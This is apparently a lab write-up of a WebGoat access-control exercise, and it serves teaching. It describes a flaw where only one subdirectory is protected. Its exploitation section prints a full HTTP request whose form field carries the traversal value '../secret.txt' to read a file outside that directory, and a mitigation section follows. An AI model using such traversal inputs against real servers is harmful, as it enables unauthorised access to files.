## Vulnerability:

Access control mechanism is only implemented for `/var/lib/tomcat6/webapps/ROOT/lesson_plans/English` directory. It allows access to files from the list and denies access for all other files (from that directory).

However (as showed in 'Exploitation' paragraph below) there is no real access control for parent direcotry (`lesson_plans/`) so user can access files from that direcotry.

## Exploitation:

I used "Live HTTP headers" add-on for Firefox to solve this level.

Here's my HTTP request that gave me access to /var/lib/tomcat6/webapps/ROOT/lesson_plans/secret.txt file:

```
Host: webgoat.hacking-lab.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://webgoat.hacking-lab.com/attack?Screen=57&menu=200
Cookie: JSESSIONID=03720BE9C23566001E524C889638B7EE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

File=../secret.txt&SUBMIT=View+File
```

## Mitigation:

Proper access control mechanism should be implemented for whole directory hierarchy in webserver's root directory (`webapps/ROOT`).

Also it is recommended that all sensitive files(like 'secret.txt') should be out of webserver's root directory ( `webapps/ROOT`) directory or should be explicitly denied in access control mechanism. 
